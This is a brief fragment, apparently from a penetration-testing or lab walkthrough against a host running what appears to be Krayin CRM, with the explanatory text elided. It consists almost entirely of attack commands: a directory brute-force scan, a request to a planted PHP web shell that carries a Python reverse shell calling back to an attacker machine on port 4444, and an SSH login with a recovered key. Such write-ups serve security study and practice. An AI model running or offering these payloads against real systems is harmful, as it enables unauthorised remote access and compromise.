...
```bash
feroxbuster -u http://192.168.101.149:8080 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,zip -t 50 --depth 2
```
...
```
http://192.168.101.149:8080/storage/tinymce/586b4bcc58836546ae24f2eb0f531c34.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.101.148",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
...
```bash
ssh -i krayin_key krayin@192.168.101.149
```
